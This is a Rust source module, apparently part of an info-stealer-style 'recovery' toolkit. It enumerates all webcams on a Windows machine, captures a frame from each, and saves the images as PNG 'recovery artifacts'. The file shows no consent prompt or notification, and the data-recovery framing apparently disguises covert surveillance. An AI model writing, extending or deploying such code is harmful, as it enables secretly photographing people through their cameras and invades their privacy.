use crate::recovery::{
    context::RecoveryContext,
    fs::sanitize_label,
    output::write_binary_artifact,
    settings::RecoveryControl,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use std::sync::Arc;
use tokio::task;
use tracing::{info, warn};

#[cfg(windows)]
use nokhwa::{
    Camera, native_api_backend,
    pixel_format::RgbFormat,
    query,
    utils::{ApiBackend, CameraInfo, RequestedFormat, RequestedFormatType},
};

pub fn webcam_task(_ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
    Arc::new(WebcamTask)
}

struct WebcamTask;

#[async_trait]
impl RecoveryTask for WebcamTask {
    fn label(&self) -> String {
        "Webcam Capture".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        if !RecoveryControl::global().capture_webcams() {
            return Ok(Vec::new());
        }

        let captures = task::spawn_blocking(capture_all_webcams)
            .await
            .map_err(|err| RecoveryError::Custom(format!("webcam capture interrupted: {err}")))?;

        let mut artifacts = Vec::new();
        for capture in captures {
            let sanitized_name = sanitize_label(&capture.device_name);
            let file_name = if sanitized_name.is_empty() {
                format!("webcam-{}.png", capture.index)
            } else {
                format!("webcam-{}-{}.png", capture.index, sanitized_name)
            };

            let artifact = write_binary_artifact(
                ctx,
                self.category(),
                &self.label(),
                &file_name,
                &capture.png_bytes,
            )
            .await?;
            artifacts.push(artifact);
        }

        Ok(artifacts)
    }
}

struct WebcamCapture {
    index: usize,
    device_name: String,
    png_bytes: Vec<u8>,
}

#[cfg(windows)]
fn capture_all_webcams() -> Vec<WebcamCapture> {
    let backend = native_api_backend().unwrap_or(ApiBackend::Auto);
    let devices = match query(backend) {
        Ok(devices) => devices,
        Err(err) => {
            warn!(error=?err, "failed to enumerate webcams");
            return Vec::new();
        }
    };

    if devices.is_empty() {
        warn!("no webcams detected for capture");
        return Vec::new();
    }

    let mut captures = Vec::new();
    for (ordinal, device_info) in devices.into_iter().enumerate() {
        let human_name = device_info.human_name();
        match capture_device(device_info, backend, ordinal + 1) {
            Ok(capture) => {
                info!(device=%capture.device_name, index=capture.index, "captured webcam frame");
                captures.push(capture);
            }
            Err(err) => {
                warn!(device=%human_name, error=?err, "failed to capture webcam frame");
            }
        }
    }

    captures
}

#[cfg(not(windows))]
fn capture_all_webcams() -> Vec<WebcamCapture> {
    warn!("webcam capture is not supported on this platform");
    Vec::new()
}

#[cfg(windows)]
fn capture_device(
    device_info: CameraInfo,
    backend: ApiBackend,
    ordinal: usize,
) -> Result<WebcamCapture, String> {
    let device_name = device_info.human_name();
    let requested =
        RequestedFormat::new::<RgbFormat>(RequestedFormatType::AbsoluteHighestFrameRate);
    let mut camera = Camera::with_backend(device_info.index().clone(), requested, backend)
        .map_err(|err| format!("camera initialization failed: {err}"))?;

    let frame = camera
        .frame()
        .map_err(|err| format!("frame capture failed: {err}"))?;
    let decoded = frame
        .decode_image::<RgbFormat>()
        .map_err(|err| format!("frame decode failed: {err}"))?;

    let width = decoded.width();
    let height = decoded.height();
    let raw_pixels = decoded.into_raw();
    let png_bytes = encode_webcam_png(width, height, &raw_pixels)?;

    Ok(WebcamCapture {
        index: ordinal,
        device_name,
        png_bytes,
    })
}

#[cfg(windows)]
fn encode_webcam_png(width: u32, height: u32, data: &[u8]) -> Result<Vec<u8>, String> {
    use image::{ColorType, ImageEncoder, codecs::png::PngEncoder};

    let mut bytes = Vec::new();
    let encoder = PngEncoder::new(&mut bytes);
    encoder
        .write_image(data, width, height, ColorType::Rgb8.into())
        .map_err(|err| format!("webcam png encode failed: {err}"))?;
    Ok(bytes)
}
